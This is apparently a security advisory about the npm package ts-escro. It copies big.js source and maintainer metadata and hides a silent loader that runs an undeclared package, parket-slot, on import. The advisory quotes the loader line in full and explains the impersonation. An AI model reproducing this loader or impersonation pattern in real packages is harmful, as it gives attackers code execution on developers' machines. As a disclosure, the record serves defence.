summary: ts-escro impersonates big.js and silently loads an undeclared sibling package on import
details: ts-escro@0.0.8 ships verbatim big.js v7.0.1 source (including the legitimate maintainer's name, email, and GitHub repository URL) but adds a top-level loader stub at big.js:606 and big.mjs:606: `const doc = require("parket-slot"); doc.from_str().then(e => { }).catch(e => { })`. The `parket-slot` package is not declared in package.json's dependencies, the call is wrapped in an empty catch that swallows all errors, and the call fires unconditionally on `require('ts-escro')` / `import 'ts-escro'`. Any code the author publishes (or later publishes) under the name `parket-slot` will be executed on the installer's machine when ts-escro is imported, giving the author arbitrary remote code execution on every consumer. The package metadata (author Michael Mclaughlin <M8ch88l@gmail.com>, repository https://github.com/MikeMcl/big.js.git, description and keywords) is copied from the genuine big.js package to deceive developers into believing they have installed the canonical library.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
